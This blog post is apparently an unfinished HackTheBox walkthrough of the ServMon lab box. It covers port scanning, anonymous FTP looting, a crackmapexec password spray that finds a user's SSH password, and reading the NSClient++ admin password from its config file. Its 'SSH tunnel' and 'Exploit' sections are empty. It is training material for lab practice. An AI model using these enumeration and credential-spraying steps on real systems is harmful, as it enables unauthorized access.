---
layout: post
title: Hackthebox ServMon Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-06/servmon.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `ServMon`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.184 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 17:48 JST
Nmap scan report for 10.10.10.184
Host is up (0.23s latency).
Not shown: 65517 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=7/4%Time=5F0048E5%P=x86_64-pc-linux-gnu%r(NULL,
SF:6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=7/4%Time=5F0048EE%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation:
SF:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\x
SF:18\xd6\x02\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\
SF:x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\
SF:.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(
SF:RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocume
SF:nt\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Lengt
SF:h:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m21s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-04T09:22:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1861.97 seconds
```

### FTP enumeration
```shell
root@kali:~# wget -r ftp://anonymous:anonymous@10.10.10.184
--2020-07-04 17:57:04--  ftp://anonymous:*password*@10.10.10.184/
           => ‘10.10.10.184/.listing’
Connecting to 10.10.10.184:21... connected.
Logging in as anonymous ... Logged in!

---

root@kali:~# tree 10.10.10.184/
10.10.10.184/
└── Users
    ├── Nadine
    │   └── Confidential.txt
    └── Nathan
        └── Notes to do.txt

3 directories, 2 files
```

### SMB enumeration
```shell
root@kali:~# smbmap -H 10.10.10.184
[!] Authentication error on 10.10.10.184

root@kali:~# smbmap -H 10.10.10.184 -u null
[!] Authentication error on 10.10.10.184
```

### Vulnerability for NSClient++
```shell
root@kali:~# searchsploit nsclient
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                        | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation                                       | windows/local/46802.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## 2. Getting User
In `Credential.txt`, we have an interesting line.<br>
It looks that we have a text file contains a password for `Nathan` on the desktop.
```shell
root@kali:~# cat 10.10.10.184/Users/Nadine/Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

```shell
root@kali:~# searchsploit nvms
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
NVMS 1000 - Directory Traversal                                   | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification  | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                               | hardware/webapps/48311.py
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```


![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-06/servmon.png)

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-06/servmon.png)

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-06/servmon.png)

```shell
root@kali:~# cat users.txt
administrator
nathan
nadine
```

```shell
root@kali:~# cat passwords.txt 
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

```shell
root@kali:~# crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt 
CME          10.10.10.184:445 SERVMON         [*] Windows 10.0 Build 18362 (name:SERVMON) (domain:SERVMON)
CME          10.10.10.184:445 SERVMON         [-] SERVMON\administrator:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\administrator:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\administrator:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\administrator:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\administrator:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\administrator:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\administrator:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [-] SERVMON\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
CME          10.10.10.184:445 SERVMON         [+] SERVMON\nadine:L1k3B1gBut7s@W0rk 
[*] KTHXBYE!
```

```shell
root@kali:~# ssh nadine@10.10.10.184
nadine@10.10.10.184's password:      # L1k3B1gBut7s@W0rk

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```

```shell
nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
2c547632176c37685eb051344e934b6c
```

## 3. Getting Root
```shell
nadine@SERVMON C:\Program Files\NSClient++>nscp web password --display
Current password: ew2x6SsGTxjRwXOT
```

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-06/servmon.png)

```shell
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
´╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
```

SSH tunnel
```shell

```

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-06/servmon.png)

Exploit
```shell

```
